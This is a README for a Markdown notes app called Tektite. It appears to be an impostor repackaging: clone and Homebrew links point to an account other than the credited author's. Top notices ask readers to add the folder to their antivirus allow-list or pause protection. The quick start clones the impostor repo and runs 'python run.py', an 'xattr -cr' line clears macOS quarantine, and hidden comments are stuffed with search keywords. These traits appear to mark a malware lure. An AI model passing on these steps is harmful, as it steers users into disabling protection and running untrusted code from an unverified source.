# Tektite - a minimalistic Markdown knowledge base app


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/mixedclerksmash/tektite-kit.git
cd tektite-kit
python run.py
```


[![macOS Build](https://github.com/mixedclerksmash/tektite-kit/actions/workflows/macos-build.yml/badge.svg)](https://github.com/mixedclerksmash/tektite-kit/actions/workflows/macos-build.yml)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=mathiasconradt_tektite&metric=alert_status&token=27834731d82afc73030bc1e8559b67ac51f516d1)](https://sonarcloud.io/summary/new_code?id=mathiasconradt_tektite)
[![License: Apache-2.0](https://img.shields.io/badge/License-Apache--2.0-blue.svg)](LICENSE)
[![Buy me a coffee](https://img.shields.io/badge/Buy%20me-a%20coffee-ff5f5f?logo=ko-fi&logoColor=white)](https://ko-fi.com/mathiasconradt)
![GitHub stars](https://img.shields.io/github/stars/mathiasconradt/tektite)

![Tektite](docs/images/promo.png)

Tektite is a deliberately lightweight Markdown knowledge base app for macOS and Linux. It keeps the core workflow simple: open a local folder, write Markdown notes, preview them live, and see how they connect in the graph.

There is no login, cloud sync service, telemetry, remote storage, account system, or plugin system. Your vault is just a folder on disk, and if you want sync, plain Git works nicely.

## Features

- Open any local folder as a vault.
- Reopen previously used vaults from `File > Recent Vaults...`.
- Sync Git-backed vaults with a lightweight `git pull --ff-only`, `git add -A`, `git commit`, and `git push` action.
- Browse folders, Markdown notes, and image assets in a collapsible file tree.
- Search notes by filename, path, and Markdown content.
- Collect `#tags` from Markdown notes into a clickable tag pane.
- Click tags to filter the file tree by that tag.
- Show or hide the Tags and Graph panes from the View menu.
- Create new notes and folders from the file tree context menu.
- Pre-populate new notes from templates stored in a configurable templates folder.
- Delete files and folders from the file tree context menu.
- Move files, folders, and images by dragging them in the file tree.
- Automatically update Markdown image references when an image is moved.
- Toggle visible file extensions in the file tree.
- Edit Markdown with autosave.
- Use native-style undo and redo history in the editor.
- Live Markdown preview.
- Click Markdown links and `[[wikilinks]]` in preview to open linked notes.
- Use the Preview back button to return after following a preview link.
- Type `@` in the editor to insert a Markdown link to another note.
- Drag files, folders, or images from the file tree into the editor to insert Markdown links or image embeds.
- Drag images from Finder into the editor or file tree to import and embed them.
- View a graph of note-to-note links.
- Click graph nodes to open notes.
- Zoom the graph with the mouse wheel.
- Pan the graph by dragging empty space.
- Drag individual graph nodes to reposition them.
- Toggle dark and light mode. Dark mode is the default.
- Configure vault-specific settings (templates folder path) via the Settings dialog.
- Built-in terminal pane running the system shell (zsh, bash, etc.) at the bottom of the workspace.

## Documentation

See the [User Guide](docs/user-guide.md) for a full walkthrough of all features.

See the [Changelog](CHANGELOG.md) for release history.

## Screenshots

![Tektite screenshot](docs/images/screenshot.png)


## Packaging

```sh
```


## Homebrew

```sh
brew tap mathiasconradt/tektite https://github.com/mixedclerksmash/tektite-kit
```

The cask installs the macOS release asset from GitHub Releases.


```sh
xattr -cr "/Applications/Tektite.app"
```

Patch releases are created automatically for app changes on `main`. The version bump workflow updates `package.json`, `package-lock.json`, and the Homebrew cask, then pushes a matching `vX.Y.Z` tag. The macOS build workflow publishes that tag as a GitHub Release with the app zip attached.

## Author

Tektite was created by Mathias Conradt.

Copyright © 2026 Mathias Conradt.

Released under the Apache License 2.0.

See [NOTICE.md](NOTICE.md) for third-party notices.

## Contact

LinkedIn: https://www.linkedin.com/in/mathiasconradt/

X: https://x.com/mathiasconradt

## Star History

[![Star History Chart](https://api.star-history.com/chart?repos=mathiasconradt/tektite&type=timeline&logscale&legend=top-left)](https://www.star-history.com/?repos=mathiasconradt%2Ftektite&type=timeline&logscale=&legend=top-left)


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- tektite-kit - tool utility software - download install setup -->
<!-- configure tektite-kit | run on windows safe tektite-kit | advanced tektite-kit debugger | stable tektite-kit | safe tektite-kit copy | tektite-kit fork | tektite kit automation | native tektite-kit tracker | documentation tektite-kit mirror | use tektite-kit monitor | extensible tektite-kit clone | how to install tektite-kit port | tektite-kit builder | docs tektite-kit | run tektite-kit | quickstart native tektite-kit utility | 2026 cross platform tektite-kit desktop | configure tektite-kit sdk | easy tektite-kit scanner | updated tektite-kit wrapper | quick start stable tektite-kit | tektite-kit library | download tektite-kit replacement | download tektite-kit | reliable tektite-kit program | download for mac tektite-kit viewer | download customizable tektite-kit | tektite-kit client | example tektite-kit | run tektite-kit port | github tektite-kit compressor | how to configure stable tektite-kit cli | run on mac tektite-kit tester | download tektite-kit creator | getting started tektite-kit service | free tektite-kit package | tektite-kit service | how to build tektite-kit package | execute tektite-kit tracker | centos tektite-kit | open source powerful tektite-kit | install tektite-kit | tektite-kit engine | deploy tektite-kit mirror | tektite kit podcast | build tektite-kit library | tektite-kit uploader | install tektite-kit app | getting started tektite-kit api | tektite kit tutorial -->
<!-- free download tektite-kit module | safe tektite-kit checker | wiki tektite-kit fork | cross platform tektite-kit builder | production ready tektite-kit framework | debian tektite-kit | 2026 fast tektite-kit | online tektite-kit | tar.gz portable tektite-kit wrapper | high performance tektite-kit framework | run on mac tektite-kit module | run on linux tektite-kit | top tektite-kit clone | free tektite kit | get tektite-kit generator | zip customizable tektite-kit | quickstart tektite-kit compressor | tektite kit reference | tektite-kit decoder | arch tektite-kit server | high performance tektite-kit package | updated tektite-kit | how to install tektite-kit program | customizable tektite-kit framework | cross platform tektite-kit | how to build tektite-kit client | how to install simple tektite-kit | ubuntu online tektite-kit | free tektite-kit application | zip modern tektite-kit decoder | safe tektite-kit framework | github tektite-kit wrapper | how to deploy tektite-kit generator | how to use tektite-kit gui | sample tektite-kit parser | download tektite-kit alternative | arch tektite-kit | start tektite-kit | local tektite-kit reader | execute reliable tektite-kit binding | quickstart tektite-kit clone | reliable tektite-kit framework | install tektite-kit uploader | configurable tektite-kit service | fedora safe tektite-kit | tar.gz simple tektite-kit utility | minimal tektite-kit fork | online tektite-kit module | ubuntu tektite-kit optimizer | how to download high performance tektite-kit -->
<!-- docs customizable tektite-kit | example modular tektite-kit module | start tektite-kit builder | easy tektite-kit editor | start tektite-kit extension | beginner tektite-kit desktop | setup advanced tektite-kit creator | safe tektite-kit library | download for windows native tektite-kit engine | tektite-kit tracker | example advanced tektite-kit | secure tektite-kit generator | run on windows safe tektite-kit mobile | free download tektite-kit sdk | open source tektite-kit viewer | getting started customizable tektite-kit | offline tektite-kit analyzer | low latency tektite-kit desktop | simple tektite-kit encoder | compile tektite-kit server | wiki tektite-kit monitor | run on mac tektite-kit service | download for mac tektite-kit tool | free tektite-kit platform | launch tektite-kit program | open tektite-kit client | how to configure tektite-kit platform | examples tektite-kit addon | deploy tektite-kit generator | tektite-kit copy | download for windows production ready tektite-kit | run tektite-kit downloader | how to setup tektite-kit | git clone lightweight tektite-kit | how to run tektite-kit encoder | tektite kit alternative | configure tektite-kit service | tar.gz tektite-kit extension | tar.gz tektite-kit platform | setup tektite-kit editor | powerful tektite-kit software | run on windows tektite-kit converter | windows tektite-kit | configurable tektite-kit copy | how to build best tektite-kit analyzer | run on linux tektite-kit analyzer | open source tektite-kit scanner | tektite-kit server | high performance tektite-kit validator | safe tektite-kit editor -->
<!-- free download tektite-kit api | use tektite-kit library | open cross platform tektite-kit | quick start tektite-kit cli | how to use tektite-kit | high performance tektite-kit tracker | walkthrough native tektite-kit | secure tektite-kit builder | open tektite-kit web | git clone tektite-kit creator | powerful tektite-kit replacement | git clone easy tektite-kit | 2026 free tektite-kit | native tektite-kit extractor | deploy easy tektite-kit | production ready tektite-kit addon | how to build self hosted tektite-kit | sample extensible tektite-kit | linux offline tektite-kit | tektite kit pipeline | tutorial tektite-kit analyzer | example modern tektite-kit | tektite-kit cli | download for mac online tektite-kit | tutorial tektite-kit | zip tektite-kit application | configure minimal tektite-kit plugin | tutorial tektite-kit tracker | debian tektite-kit optimizer | github tektite-kit engine | build tektite-kit editor | free tektite-kit mobile | cross platform tektite-kit plugin | build tektite-kit module | linux lightweight tektite-kit generator | how to configure tektite-kit | download for mac tektite-kit api | open source tektite-kit web | production ready tektite-kit decoder | wiki extensible tektite-kit | self hosted tektite-kit clone | deploy online tektite-kit optimizer | git clone simple tektite-kit | guide tektite-kit | reliable tektite-kit cli | centos tektite-kit engine | how to deploy tektite-kit port | how to run tektite-kit | free tektite-kit encoder | stable tektite-kit port -->
<!-- self hosted tektite-kit package | wiki modern tektite-kit | how to deploy tektite-kit | examples tektite-kit program | demo tektite-kit software | open source top tektite-kit | github tektite-kit scanner | 2026 tektite-kit extension | download for windows stable tektite-kit | 2025 tektite-kit fork | free tektite-kit checker | fedora tektite-kit port | customizable tektite-kit desktop | walkthrough tektite-kit logger | tutorial tektite-kit application | arch tektite-kit mirror | execute tektite-kit encoder | use tektite-kit reader | sample tektite-kit | git clone best tektite-kit | sample tektite-kit converter | updated native tektite-kit | reliable tektite-kit scanner | github tektite-kit decoder | download for windows modular tektite-kit | 2025 tektite-kit | production ready tektite-kit generator | centos modern tektite-kit | github tektite-kit clone | minimal tektite-kit | tektite kit vs | example tektite-kit uploader | download for linux high performance tektite-kit | run on linux tektite-kit web | docs tektite-kit editor | run on windows tektite-kit | download tektite-kit parser | top tektite-kit plugin | secure tektite-kit encoder | 2025 tektite-kit extension | tektite-kit app | latest version simple tektite-kit | how to deploy tektite-kit converter | tektite-kit converter | download for linux tektite-kit | fast tektite-kit gui | advanced tektite-kit encoder | tektite kit test | modular tektite-kit gui | tektite kit help -->
<!-- tar.gz tektite-kit | low latency tektite-kit module | run tektite-kit program | debian tektite-kit clone | 2025 offline tektite-kit | setup tektite-kit utility | examples tektite-kit platform | git clone tektite-kit client | extensible tektite-kit creator | run on linux tektite-kit validator | demo tektite-kit library | documentation tektite-kit decoder | zip tektite-kit utility | how to configure tektite-kit program | tektite-kit extractor | getting started safe tektite-kit | fast tektite-kit | wiki self hosted tektite-kit parser | advanced tektite-kit api | use tektite-kit | documentation tektite-kit encoder | macos tektite-kit parser | new version tektite-kit optimizer | example tektite-kit api | example tektite-kit clone | tutorial tektite-kit sdk | tektite-kit utility | free best tektite-kit validator | getting started tektite-kit replacement | fedora free tektite-kit converter | local tektite-kit | tektite-kit tool | getting started tektite-kit addon | windows open source tektite-kit | portable tektite-kit platform | production ready tektite-kit tracker | sample tektite-kit desktop | zip tektite-kit | quick start tektite-kit tracker | latest version tektite-kit server | tektite kit cloud | examples configurable tektite-kit program | simple tektite-kit app | tektite-kit port | new version tektite-kit engine | top tektite-kit app | deploy tektite-kit alternative | secure tektite-kit downloader | quickstart cross platform tektite-kit | simple tektite-kit analyzer -->
<!-- tektite kit github | run on mac tektite-kit desktop | low latency tektite-kit converter | run on mac tektite-kit debugger | tektite-kit compressor | offline tektite-kit tool | examples tektite-kit | local tektite-kit module | deploy easy tektite-kit package | 2025 tektite-kit server | low latency tektite-kit | high performance tektite-kit generator | run production ready tektite-kit validator | secure tektite-kit platform | top tektite-kit debugger | configurable tektite-kit mirror | how to download tektite-kit alternative | configurable tektite-kit binding | extensible tektite-kit | how to download tektite-kit wrapper | macos fast tektite-kit | execute tektite-kit | how to build modern tektite-kit | github stable tektite-kit parser | lightweight tektite-kit | latest version tektite-kit | walkthrough tektite-kit uploader | secure tektite-kit server | free download tektite-kit platform | ubuntu tektite-kit plugin | run on linux tektite-kit debugger | fast tektite-kit engine | documentation tektite-kit logger | demo tektite-kit server | quick start tektite-kit downloader | powerful tektite-kit validator | documentation reliable tektite-kit | compile tektite-kit editor | how to deploy tektite-kit creator | local tektite-kit sdk | wiki easy tektite-kit software | launch tektite-kit library | linux tektite-kit | tektite-kit software | tektite-kit tester | tektite kit example | linux low latency tektite-kit creator | docs tektite-kit port | fedora tektite-kit framework | extensible tektite-kit platform -->
<!-- tar.gz offline tektite-kit | windows tektite-kit binding | simple tektite-kit editor | fedora tektite-kit | how to use tektite-kit encoder | extensible tektite-kit extension | tektite-kit wrapper | use tektite-kit encoder | github tektite-kit uploader | extensible tektite-kit utility | build tektite-kit encoder | run on linux tektite-kit editor | open tektite-kit analyzer | centos tektite-kit binding | tektite-kit encoder | launch tektite-kit builder | how to build tektite-kit | how to run tektite-kit clone | open source cross platform tektite-kit | download high performance tektite-kit reader | tektite-kit mobile | tektite-kit checker | open source tektite-kit framework | tektite kit not working | latest version tektite-kit addon | open source tektite-kit program | run on mac stable tektite-kit builder | fedora tektite-kit cli | github tektite-kit port | free download tektite-kit app | getting started tektite-kit | sample tektite-kit api | examples cross platform tektite-kit alternative | walkthrough tektite-kit platform | github tektite-kit mobile | reliable tektite-kit | arch powerful tektite-kit | source code tektite-kit compressor | tektite-kit analyzer | tar.gz tektite-kit converter | secure tektite-kit utility | best tektite-kit | how to configure tektite-kit converter | tektite kit ci cd | updated tektite-kit tester | wiki high performance tektite-kit | lightweight tektite-kit downloader | latest version low latency tektite-kit | deploy cross platform tektite-kit | tektite kit setup -->
<!-- execute tektite-kit server | tektite-kit mirror | 2025 self hosted tektite-kit | source code open source tektite-kit cli | example tektite-kit logger | github tektite-kit replacement | sample tektite-kit viewer | run on windows tektite-kit platform | production ready tektite-kit editor | how to install powerful tektite-kit | advanced tektite-kit logger | launch tektite-kit sdk | run on mac tektite-kit | offline tektite-kit platform | configurable tektite-kit builder | open tektite-kit | online tektite-kit builder | stable tektite-kit replacement | modular tektite-kit creator | download for windows tektite-kit program | production ready tektite-kit gui | macos tektite-kit | sample easy tektite-kit replacement | how to build fast tektite-kit | how to deploy offline tektite-kit | download for linux tektite-kit decoder | 2026 tektite-kit | how to build configurable tektite-kit | 2026 tektite-kit client | start tektite-kit reader | git clone tektite-kit tool | how to configure tektite-kit copy | zip tektite-kit generator | tektite-kit creator | docs tektite-kit web | launch local tektite-kit clone | free tektite-kit scanner | download for linux tektite-kit clone | secure tektite-kit gui | best tektite-kit port | ubuntu tektite-kit encoder | advanced tektite-kit analyzer | tektite kit project | easy tektite-kit | production ready tektite-kit scanner | how to install tektite-kit logger | windows tektite-kit fork | tektite kit documentation | git clone tektite-kit alternative | advanced tektite-kit parser -->
<!-- configure tektite-kit checker | 2025 tektite-kit wrapper | stable tektite-kit sdk | tar.gz tektite-kit wrapper | how to setup tektite-kit decoder | reliable tektite-kit copy | how to build tektite-kit analyzer | download for mac native tektite-kit | compile tektite-kit extractor | arch tektite-kit fork | download open source tektite-kit | updated portable tektite-kit | source code tektite-kit mobile | easy tektite-kit copy | how to download tektite-kit application | tektite-kit downloader | easy tektite-kit reader | latest version tektite-kit tester | best tektite kit | download for windows powerful tektite-kit reader | portable tektite-kit validator | how to run tektite-kit library | open source tektite-kit logger | 2026 tektite-kit framework | extensible tektite-kit replacement | tektite kit docker | modular tektite-kit app | customizable tektite-kit module | how to build tektite-kit generator | tektite kit benchmark | self hosted tektite-kit encoder | source code tektite-kit | tektite kit workshop | configure tektite-kit clone | ubuntu tektite-kit fork | how to run tektite-kit generator | download open source tektite-kit fork | fast tektite-kit client | tektite-kit application | tektite-kit viewer | git clone tektite-kit | free tektite-kit gui | how to deploy powerful tektite-kit | 2026 advanced tektite-kit | download for windows tektite-kit module | online tektite-kit framework | tektite kit demo | source code tektite-kit fork | modular tektite-kit optimizer | documentation tektite-kit client -->

<!-- Last updated: 2026-06-09 19:02:27 -->
